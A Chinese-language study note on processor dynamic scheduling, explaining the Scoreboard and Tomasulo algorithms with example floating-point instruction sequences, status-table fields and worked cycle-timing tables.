<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 5608 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 27 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 18 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 20 分钟</p>
</div>
<h2 id="note-arch-chap4-dynamic-scheduling">Dynamic scheduling<a class="headerlink" href="#note-arch-chap4-dynamic-scheduling" title="Permanent link">&para;</a></h2>
<figure>
<img alt="image" src="../NOTE/Arch/img/chap4-1.png" />

<figcaption>dynamic scheduling with Scoreboard</figcaption>
</figure>
<p>在RISC-V中，处理器会在ID阶段检查structure hazards和data hazards；</p>
<p>当一条指令可以在没有危险的情况下执行时，它会从ID阶段发出，因为所有的数据危险都已解决</p>
<p>为了支持乱序执行，将ID阶段分成两个阶段</p>
<ul>
<li><strong>Issue(IS)</strong>  这是指令发射的第一阶段，主要功能是解码指令并检查结构冒险(structural hazards),这是一个按序(in-order)的阶段，意味着指令必须按照程序顺序进入这个阶段</li>
</ul>
<p>结构冒险检查包括：</p>
<ul>
<li>检查是否有可用的功能单元(如ALU、FPU等)</li>
<li>检查是否有可用的寄存器文件端口</li>
<li>
<p>检查是否有可用的保留站(reservation station)空间</p>
</li>
<li>
<p><strong>Read Operands(RO)</strong> 阶段：这是指令发射的第二阶段，主要功能是等待直到没有数据冒险，然后读取操作数
这是一个乱序(out-of-order)的阶段，意味着指令可以在这个阶段以不同于程序顺序的方式执行</p>
</li>
</ul>
<p>在这个阶段：</p>
<ul>
<li>处理器会等待所有数据依赖都被解决</li>
<li>一旦数据可用，就会读取操作数</li>
<li>指令可以开始执行</li>
</ul>
<h3 id="note-arch-chap4-scoreboard-algorithm">Scoreboard algorithm<a class="headerlink" href="#note-arch-chap4-scoreboard-algorithm" title="Permanent link">&para;</a></h3>
<p>Scoreboard的主要组成部分：</p>
<ul>
<li>
<p>指令状态表：
  记录每条指令的执行状态
  包括：Issue、Read Operands、Execute、Write Result等阶段</p>
</li>
<li>
<p>功能单元状态表：
  记录每个功能单元(如ALU、FPU等)的状态
  包括：Busy、Op、Fi、Fj、Fk、Qj、Qk、Rj、Rk等字段  </p>
</li>
<li>
<p>寄存器结果状态表：
  记录每个寄存器的状态
  指示哪个功能单元将写入该寄存器</p>
</li>
</ul>
<p>例如下面的例子</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-arch-chap4-__codelineno-0-1"></a>FLD F6,34(R2)# 将内存地址为34+R2的值加载到F6
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-arch-chap4-__codelineno-0-2"></a>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-arch-chap4-__codelineno-0-3"></a>FLD F2 45(R3)# 将内存地址为45+R3的值加载到F2
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-arch-chap4-__codelineno-0-4"></a>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-arch-chap4-__codelineno-0-5"></a>Fmul F0 F2 F4# 将F2和F4相乘，结果存储到F0 RAW
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-arch-chap4-__codelineno-0-6"></a>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-arch-chap4-__codelineno-0-7"></a>Fsub F8 F6 F2# 将F6减去F2，结果存储到F8  RAW
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-arch-chap4-__codelineno-0-8"></a>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-arch-chap4-__codelineno-0-9"></a>Fdiv F10 F0 F6# 将F0除以F6，结果存储到F10  RAW
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#note-arch-chap4-__codelineno-0-10"></a>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#note-arch-chap4-__codelineno-0-11"></a>Fadd F6 F8 F2# 将F8和F2相加，结果存储到F6 WAR RAW
</span></code></pre></div>
<figure>
<img alt="image" src="../NOTE/Arch/img/chap4-2.png" />
<img alt="image" src="../NOTE/Arch/img/chap4-3.png" />
<img alt="image" src="../NOTE/Arch/img/chap4-4.png" />
</figure>
<p>首先，第一条指令全部执行，Board上没有其信息，第二条指令执行到EX阶段( <em>各种指令的EX阶段所需时钟周期不一样</em> ),第三条指令与第二条指令F2数据依赖，不能进入RO；第四条指令与第二条指令F2数据依赖，不能进入RO；第五条指令与第三条指令F0数据依赖，不能进入RO；第六条指令与第四条指令有结构冲突，都要使用加法单元，不能进入IS；</p>
<p>以上的判断都是处理器根据Scoreboard上的信息做出的；</p>
<p>在这个阶段，Integer单元(进行地址计算，整数访问，内存访问的单元)Busy，其对应的指令是Load，Fi是F2，Fj是R3，Rj是no表示已经读取了R3的值，Qj是null表示没有功能单元正在使用R3的值；</p>
<p>根据已有信息，将第三条指令放入IS阶段，更新表，其使用第一个乘法器，所以Fi是F0，Fj是F2，Fk是F4，Qj是Integer，Qk是null，Rj是no，Rk是yes；代表F2即将来自Integer单元，但是没有准备好，F4准备好了，但是没有读取，这条指令不能进入RO阶段；</p>
<p>然后到SUB指令，由于加法单元是空闲的，所以可以进入IS阶段，更新表，Add被使用，Fi是F8，Fj是F6，Fk是F2，Qk是Integer，Rj是yes，Rk是no；代表F6准备好了，F2即将来自Integer单元，但是没有准备好，这条指令不能进入RO阶段；</p>
<p>然后后是DIV指令，除法单元空闲，所以可以进入IS阶段，更新表，Div被使用，Fi是F10，Fj是F0，Fk是F6，Qj是Mult1，Rj是no，Rk是yes；代表F0的数据来自Mult1单元，还没有准备好，F6的已经准备好了，这条指令可以进入RO阶段；</p>
<p>最后是add指令，发现加法单元busy，停在IS阶段，等待加法单元空闲；</p>
<p>寄存器信息来自哪些单元是通过查找寄存器状态表得到，并不断更新；</p>
<div class="admonition note">
<p class="admonition-title">各个字段的意义</p>
<p>1 <code>Busy</code>: 功能单元是否正在使用</p>
<ul>
<li>yes = 功能单元正忙</li>
<li>no = 功能单元空闲</li>
</ul>
<p>2 <code>Op</code>: 当前执行的操作类型</p>
<ul>
<li>Load = 加载操作</li>
<li>MUL = 乘法操作</li>
<li>SUB = 减法操作</li>
<li>DIV = 除法操作</li>
</ul>
<p>3 <code>Fi</code>: 目标寄存器(存放结果的寄存器)</p>
<p>4 <code>Fj</code>, <code>Fk</code>: 源操作数寄存器</p>
<ul>
<li>例如：R3, F2, F4等是源操作数</li>
</ul>
<p>5 <code>Qj</code>, <code>Qk</code>: 产生源操作数的功能单元</p>
<ul>
<li>Integer = 整数单元</li>
<li>Mult1 = 乘法单元1</li>
<li>如果为空，表示操作数已就绪</li>
</ul>
<p>6 <code>Rj</code>, <code>Rk</code>: 源操作数的就绪状态</p>
<ul>
<li>"yes" = 操作数已就绪但未读取</li>
<li>"no" &amp; "Qj = null" = 操作数已读取</li>
<li>"no" &amp; "Qj != null" = 操作数未就绪</li>
</ul>
<p>寄存器状态表(Register Status)的字段：</p>
<p>1 寄存器编号：F0, F2, F4等</p>
<p>2 <code>Qi</code>: 指示哪个功能单元将会写入该寄存器</p>
<ul>
<li>Mult1 = 乘法单元1将写入</li>
<li>Integer = 整数单元将写入</li>
<li>Add = 加法单元将写入</li>
<li>Divide = 除法单元将写入</li>
</ul>
</div>
<figure>
<img alt="image" src="../NOTE/Arch/img/chap4-5.png" />
<img alt="image" src="../NOTE/Arch/img/chap4-6.png" />
</figure>
<p>第二条指令WB后，寄存器状态表更新，此时第三条指令在EX阶段，第四条指令是减法，可以比较快完成，其结束后，ADD指令可以进入到EX阶段，但是由于必须等到DIV阶段进入RO后，才能进入WB阶段，所以ADD指令必须等待，而DIV阶段要进入RO，就必须等待F0的数据准备好，所以DIV指令也要等待；</p>
<figure>
<img alt="image" src="../NOTE/Arch/img/chap4-7.png" />
<img alt="image" src="../NOTE/Arch/img/chap4-8.png" />
</figure>
<p>当MUL指令结束后，FDIV指令进入RO阶段时，ADD指令可以写回，此时没有冲突了，只剩下DIV指令继续执行结束即可；</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>假设EX阶段有以下时钟周期</p>
<ul>
<li>Load： 1</li>
<li>MUL： 10</li>
<li>SUB/ADD： 2</li>
<li>DIV： 40</li>
</ul>
<p>其它阶段为1;</p>
<p>则对于上面的指令，完成的时钟周期为，对于第一条指令，直接顺序完成</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>IS</th>
<th>RO</th>
<th>EX</th>
<th>WB</th>
</tr>
</thead>
<tbody>
<tr>
<td>FLD F6,34(R2)</td>
<td>1</td>
<td>2</td>
<td>3</td>
<td>4</td>
</tr>
<tr>
<td>FLD F2 45(R3)</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Fmul F0 F2 F4</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Fsub F8 F6 F2</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Fdiv F10 F0 F6</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Fadd F6 F8 F2</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>由于Integer在第一条指令未结束期间都被占用，所以第二条指令在第一条结束之后才能进入</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>IS</th>
<th>RO</th>
<th>EX</th>
<th>WB</th>
</tr>
</thead>
<tbody>
<tr>
<td>FLD F6,34(R2)</td>
<td>1</td>
<td>2</td>
<td>3</td>
<td>4</td>
</tr>
<tr>
<td>FLD F2 45(R3)</td>
<td>5</td>
<td>6</td>
<td>7</td>
<td>8</td>
</tr>
<tr>
<td>Fmul F0 F2 F4</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Fsub F8 F6 F2</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Fdiv F10 F0 F6</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Fadd F6 F8 F2</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>而IS是需要顺序的，所以第二条指令进入RO阶段，第三条指令才能进入IS，在第二条指令结束之后，第三条指令才能进入RO阶段,之后就继续执行</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>IS</th>
<th>RO</th>
<th>EX</th>
<th>WB</th>
</tr>
</thead>
<tbody>
<tr>
<td>FLD F6,34(R2)</td>
<td>1</td>
<td>2</td>
<td>3</td>
<td>4</td>
</tr>
<tr>
<td>FLD F2 45(R3)</td>
<td>5</td>
<td>6</td>
<td>7</td>
<td>8</td>
</tr>
<tr>
<td>Fmul F0 F2 F4</td>
<td>6</td>
<td>9</td>
<td>10-19</td>
<td>20</td>
</tr>
<tr>
<td>Fsub F8 F6 F2</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Fdiv F10 F0 F6</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Fadd F6 F8 F2</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>第四条指令等待Fmul的IS阶段结束之后进入，而其与F2存在冲突，所以也需要等待F2的WB阶段结束再继续进入RO阶段，然后正常执行</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>IS</th>
<th>RO</th>
<th>EX</th>
<th>WB</th>
</tr>
</thead>
<tbody>
<tr>
<td>FLD F6,34(R2)</td>
<td>1</td>
<td>2</td>
<td>3</td>
<td>4</td>
</tr>
<tr>
<td>FLD F2 45(R3)</td>
<td>5</td>
<td>6</td>
<td>7</td>
<td>8</td>
</tr>
<tr>
<td>Fmul F0 F2 F4</td>
<td>6</td>
<td>9</td>
<td>10-19</td>
<td>20</td>
</tr>
<tr>
<td>Fsub F8 F6 F2</td>
<td>7</td>
<td>9</td>
<td>10-11</td>
<td>12</td>
</tr>
<tr>
<td>Fdiv F10 F0 F6</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Fadd F6 F8 F2</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>第五条指令等待Fmul的WB阶段结束之后进入R0，然后正常执行</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>IS</th>
<th>RO</th>
<th>EX</th>
<th>WB</th>
</tr>
</thead>
<tbody>
<tr>
<td>FLD F6,34(R2)</td>
<td>1</td>
<td>2</td>
<td>3</td>
<td>4</td>
</tr>
<tr>
<td>FLD F2 45(R3)</td>
<td>5</td>
<td>6</td>
<td>7</td>
<td>8</td>
</tr>
<tr>
<td>Fmul F0 F2 F4</td>
<td>6</td>
<td>9</td>
<td>10-19</td>
<td>20</td>
</tr>
<tr>
<td>Fsub F8 F6 F2</td>
<td>7</td>
<td>9</td>
<td>10-11</td>
<td>12</td>
</tr>
<tr>
<td>Fdiv F10 F0 F6</td>
<td>8</td>
<td>21</td>
<td>22-61</td>
<td>62</td>
</tr>
<tr>
<td>Fadd F6 F8 F2</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>最后一条指令，需要等待Fsub的WB阶段结束后，加法单元被释放，然后进入EX阶段，在这里，需要等待Fdiv的RO结束，F6读走了，才能WB</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>IS</th>
<th>RO</th>
<th>EX</th>
<th>WB</th>
</tr>
</thead>
<tbody>
<tr>
<td>FLD F6,34(R2)</td>
<td>1</td>
<td>2</td>
<td>3</td>
<td>4</td>
</tr>
<tr>
<td>FLD F2 45(R3)</td>
<td>5</td>
<td>6</td>
<td>7</td>
<td>8</td>
</tr>
<tr>
<td>Fmul F0 F2 F4</td>
<td>6</td>
<td>9</td>
<td>10-19</td>
<td>20</td>
</tr>
<tr>
<td>Fsub F8 F6 F2</td>
<td>7</td>
<td>9</td>
<td>10-11</td>
<td>12</td>
</tr>
<tr>
<td>Fdiv F10 F0 F6</td>
<td>8</td>
<td>21</td>
<td>22-61</td>
<td>62</td>
</tr>
<tr>
<td>Fadd F6 F8 F2</td>
<td>13</td>
<td>14</td>
<td>15-16</td>
<td>22</td>
</tr>
</tbody>
</table>
</div>
<h3 id="note-arch-chap4-tomasulo-algorithm">Tomasulo algorithm<a class="headerlink" href="#note-arch-chap4-tomasulo-algorithm" title="Permanent link">&para;</a></h3>
<p>Tomasulo's Algorithm 是一种处理器指令级并行的重要算法，主要用于动态调度和乱序执行。它的核心目标是通过硬件机制来解决数据依赖和资源冲突，提高指令级并行性。</p>
<ol>
<li><strong>动态调度</strong>：允许指令乱序执行</li>
<li><strong>寄存器重命名</strong>：消除写后读(WAR)和写后写(WAW)冒险</li>
<li><strong>硬件保留站(Reservation Stations)</strong>：管理指令执行</li>
<li><strong>公共数据总线(Common Data Bus, CDB)</strong>：广播计算结果</li>
</ol>
<figure>
<img alt="image" src="../NOTE/Arch/img/chap4-9.png" width="500" />
</figure>
<h4 id="note-arch-chap4-reservation-stations">Reservation Stations<a class="headerlink" href="#note-arch-chap4-reservation-stations" title="Permanent link">&para;</a></h4>
<ul>
<li>每种功能单元(ALU、乘法器、除法器等)都有自己的保留站</li>
<li>存储等待执行的指令信息</li>
<li>跟踪操作数的状态和来源</li>
</ul>
<h4 id="note-arch-chap4-_1">数据依赖处理<a class="headerlink" href="#note-arch-chap4-_1" title="Permanent link">&para;</a></h4>
<ul>
<li><strong>RAW依赖</strong>：通过跟踪操作数的可用性来最小化影响</li>
<li>当操作数就绪时，立即将值传递给等待的指令</li>
<li>
<p>使用Qj和Qk字段跟踪哪些保留站将产生所需的操作数</p>
</li>
<li>
<p><strong>WAW和WAR依赖</strong>：通过硬件寄存器重命名自动消除</p>
</li>
<li>指令使用保留站而不是实际寄存器作为中间存储</li>
<li>允许多个指令同时写入同一逻辑寄存器的不同物理位置</li>
</ul>
<h4 id="note-arch-chap4-renaming">Renaming<a class="headerlink" href="#note-arch-chap4-renaming" title="Permanent link">&para;</a></h4>
<ul>
<li>使用保留站消除寄存器相关性</li>
<li>允许指令提前执行，避免不必要的等待</li>
</ul>
<h4 id="note-arch-chap4-issue">发射阶段(Issue)<a class="headerlink" href="#note-arch-chap4-issue" title="Permanent link">&para;</a></h4>
<ul>
<li>检查是否有可用的保留站</li>
<li>检查操作数是否就绪，如果就绪，则将操作数写入保留站，如果没有就绪，那么仍让将其写入保留站，但是需要等待，并跟踪会产生操作数的unit</li>
<li>如果保留站满，则暂停发射</li>
</ul>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>在这个阶段，消除了WAR和WAW依赖，因为此时发生了重命名</p>
</div>
<h4 id="note-arch-chap4-execute">执行阶段(Execute)<a class="headerlink" href="#note-arch-chap4-execute" title="Permanent link">&para;</a></h4>
<ul>
<li>当操作数就绪时，开始执行</li>
<li>可以乱序执行</li>
<li>等待功能单元可用</li>
</ul>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>对应Load和Store指令需要两步运算过程，第一步是当base register和offset相加得到地址，然后将其放入到load store buffer中</p>
</div>
<h4 id="note-arch-chap4-write-back">写回阶段(Write Back)<a class="headerlink" href="#note-arch-chap4-write-back" title="Permanent link">&para;</a></h4>
<ul>
<li>通过公共数据总线(CDB)广播结果</li>
<li>更新等待该结果的保留站</li>
<li>更新寄存器状态</li>
</ul>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>当一条Store指令执行时，它的值和地址可能不会立即同时可用,这些信息会被暂时存储在"存储缓冲区"(store buffer)中,只有当两个信息（值和地
 址）都准备好时，并且内存单元空闲时才会真正执行实际的内存写入操作</p>
</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>假设现在有两条指令</p>
<p><div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-arch-chap4-__codelineno-1-1"></a>MUL F0 F2 F4
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-arch-chap4-__codelineno-1-2"></a>ADD F2 F0 F6
</span></code></pre></div>
<figure markdown="span">
<img alt="image" src="../NOTE/Arch/img/chap4-10.png" width="500" />
</figure></p>
<p>首先，将乘法指令放入乘法保留站，然后将F2的值(a),F4的值(b)写入,结果是要写回F0的，所以在F0需要track结果来自MULT1</p>
<p><figure markdown="span">
<img alt="image" src="../NOTE/Arch/img/chap4-11.png" width="500" />
</figure></p>
<p>接下来，ADD指令进入,将其放入ADD保留站，F0的值查看寄存器状态表，得知来自MULT1，F6的值立即准备好，然后其要写回F2，所以需要track结果来自ADD</p>
<p><figure markdown="span">
<img alt="image" src="../NOTE/Arch/img/chap4-12.png" width="500" />
</figure></p>
<p>当乘法指令结束后，写回F0，将值加载到ADD保留站，最后将ADD指令执行完即可.</p>
</div>
<h3 id="note-arch-chap4-tables-of-tomasulo-algorithm">Tables of Tomasulo algorithm<a class="headerlink" href="#note-arch-chap4-tables-of-tomasulo-algorithm" title="Permanent link">&para;</a></h3>
<p>在这个算法中，主要有以下三张表</p>
<ul>
<li>
<p><strong>Instruction status table</strong> : This table is included only to help you understand the algorithm; it is not actually a part of the hardware.</p>
</li>
<li>
<p><strong>Reservation stations table</strong> : The reservation station keeps the state 
of each operation that has issued.</p>
</li>
<li>
<p><strong>Register status table (Field Qi)</strong> : The number of the reservation station that contains the operation whose result should be stored into this register.当进入reservation station时发现不能直接取出寄存器的值时，需要通过这张表来找到对应的保留站，查看来自哪个保留站；（这里面存的是reservation station的编号，在这个reservation station中，其操作结果会写入这个寄存器）</p>
</li>
</ul>
<p>每个保留站包含七个字段：</p>
<ul>
<li><strong>Op</strong>：对源操作数执行的操作。</li>
<li><strong>Qj, Qk</strong>：将产生相应源操作数的保留站编号。</li>
<li><strong>Vj, Vk</strong>：源操作数的值。</li>
<li><strong>Busy</strong>：表示此保留站及其附带的功能单元正在被占用。</li>
<li><strong>A</strong>：用于保存加载或存储操作的内存地址计算信息。</li>
</ul>
<p>这些字段共同工作，使得Tomasulo算法能够有效地跟踪指令依赖关系，实现乱序执行，并确保结果的正确性。当一个操作需要等待其他操作的结果时，Qj和Qk字段会指向产生这些结果的保留站，一旦结果可用，它们会通过CDB广播并更新到相应的Vj和Vk字段中。</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>假设现在有以下指令</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="special"><a href="#note-arch-chap4-__codelineno-2-1">1</a></span>
<span class="special"><a href="#note-arch-chap4-__codelineno-2-2">2</a></span>
<span class="special"><a href="#note-arch-chap4-__codelineno-2-3">3</a></span>
<span class="special"><a href="#note-arch-chap4-__codelineno-2-4">4</a></span>
<span class="special"><a href="#note-arch-chap4-__codelineno-2-5">5</a></span>
<span class="special"><a href="#note-arch-chap4-__codelineno-2-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>FLD F6, 34（R2）
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>FLD F2, 45（R3）
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>FMUL.D F0, F2, F4
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>FSUB.D F8, F2, F6
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a>FDIV.D F10, F0, F6
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a>FADD.D F6, F8, F2
</span></code></pre></div></td></tr></table></div>
<p>在某一时刻，三张表的状态可能如下所示</p>
<p><figure markdown="span">
<img alt="image" src="../NOTE/Arch/img/chap4-14.png" width="500" />
<figcaption>Instruction status table</figcaption>
</figure></p>
<p><figure markdown="span">
<img alt="image" src="../NOTE/Arch/img/chap4-15.png" width="500" />
<figcaption>Reservation stations table</figcaption>
</figure></p>
<p><figure markdown="span">
<img alt="image" src="../NOTE/Arch/img/chap4-16.png" width="500" />
<figcaption>Register status table</figcaption>
</figure></p>
</div>
<div class="admonition summary">
<p class="admonition-title">Summary</p>
<p>Tomasulo算法的主要贡献：</p>
<ul>
<li>
<p><strong>动态调度（Dynamic scheduling）</strong> ：允许指令在数据依赖关系允许的情况下乱序执行，提高处理器利用率。</p>
</li>
<li>
<p><strong>寄存器重命名（Register renaming）</strong> ：通过保留站机制实现了隐式的寄存器重命名，有效消除了WAW（写后写）和WAR（写后读）冒险。</p>
</li>
<li>
<p><strong>加载/存储消歧义（Load/store disambiguation）</strong> </p>
</li>
<li>
<p><strong>优于记分板算法（Better than Scoreboard Algorithm）</strong> ：Tomasulo算法通过CDB（公共数据总线）和保留站机制，提供了更灵活的执行模型，能够更有效地处理复杂的依赖关系和资源竞争。</p>
</li>
</ul>
<p>但是，Tomasulo算法也有一些缺点：</p>
<ul>
<li>
<p><strong>复杂性</strong> ：需要维护多个表，增加了硬件开销。</p>
</li>
<li>
<p>其性能会受到公共数据总线的限制</p>
</li>
</ul>
<p><strong>Load/Store Disambiguation</strong></p>
<p>加载/存储消歧义是Tomasulo算法中处理内存操作的重要机制。它允许处理器确定何时可以安全地乱序执行内存操作。</p>
<p>当处理器遇到加载（load）和存储（store）指令时，需要确定这些操作是否可以安全地乱序执行：</p>
<ul>
<li>
<p><strong>不同地址的操作</strong>：如果加载和存储操作访问的是不同的内存地址，它们可以安全地乱序执行。</p>
</li>
<li>
<p><strong>相同地址的操作</strong>：如果加载和存储操作访问相同的内存地址，则必须考虑以下情况：</p>
</li>
<li>
<p>如果加载在程序顺序中位于存储之前，而执行时将它们交换顺序，会导致**写后读（WAR）冒险**。</p>
</li>
<li>
<p>如果存储在程序顺序中位于加载之前，而执行时将它们交换顺序，会导致**读后写（RAW）冒险**。</p>
</li>
<li>
<p>如果交换两个访问相同地址的存储操作的顺序，会导致**写后写（WAW）冒险**。</p>
</li>
</ul>
<p>假设有以下两条内存访问指令：</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="special"><a href="#note-arch-chap4-__codelineno-3-1">1</a></span>
<span class="special"><a href="#note-arch-chap4-__codelineno-3-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>LOAD R1, [A]  // 将内存地址A中的值加载到寄存器R1
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>STORE [A], R2 // 将寄存器R2的值存储到内存地址A
</span></code></pre></div></td></tr></table></div>
<p>在程序的顺序执行中，这两条指令应该是先执行LOAD指令，将内存地址A的值加载到R1，然后执行STORE指令，将R2的值存储到内存地址A。
但在乱序执行的处理器中，如果执行顺序被交换（即STORE指令先执行，然后再执行LOAD指令），就会发生WAR冒险：
STORE指令先执行，内存地址A的值会被R2的值覆盖
随后执行LOAD指令时，加载的将是R2的值而不是原来内存地址A中应该读取的值</p>
</div>
<div class="admonition question">
<p class="admonition-title">Question</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="special"><a href="#note-arch-chap4-__codelineno-4-1">1</a></span>
<span class="special"><a href="#note-arch-chap4-__codelineno-4-2">2</a></span>
<span class="special"><a href="#note-arch-chap4-__codelineno-4-3">3</a></span>
<span class="special"><a href="#note-arch-chap4-__codelineno-4-4">4</a></span>
<span class="special"><a href="#note-arch-chap4-__codelineno-4-5">5</a></span>
<span class="special"><a href="#note-arch-chap4-__codelineno-4-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>FLD F6, 34（R2）
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>FLD F2, 45（R3）
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>FMUL.D F0, F2, F4
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a>FSUB.D F8, F2, F6
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a>FDIV.D F10, F0, F6
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a>FADD.D F6, F8, F2
</span></code></pre></div></td></tr></table></div>
<p>仍是上面的指令，如果ADD需要2个周期，乘法需要10个周期，除法需要40个周期，其它的需要1个周期，那么每个指令每个阶段都在什么周期完成</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>IS</th>
<th>EX</th>
<th>WB</th>
</tr>
</thead>
<tbody>
<tr>
<td>FLD F6, 34（R2）</td>
<td>1</td>
<td>3</td>
<td>4</td>
</tr>
<tr>
<td>FLD F2, 45（R3）</td>
<td>2</td>
<td>4</td>
<td>5</td>
</tr>
<tr>
<td>FMUL.D F0, F2, F4</td>
<td>3</td>
<td>6-15</td>
<td>16</td>
</tr>
<tr>
<td>FSUB.D F8, F2, F6</td>
<td>4</td>
<td>6-7</td>
<td>8</td>
</tr>
<tr>
<td>FDIV.D F10, F0, F6</td>
<td>5</td>
<td>17-56</td>
<td>57</td>
</tr>
<tr>
<td>FADD.D F6, F8, F2</td>
<td>6</td>
<td>9-10</td>
<td>11</td>
</tr>
</tbody>
</table>
<p>由于保留站的存在，可以比计分板算法更早进入IS阶段.</p>
</div>
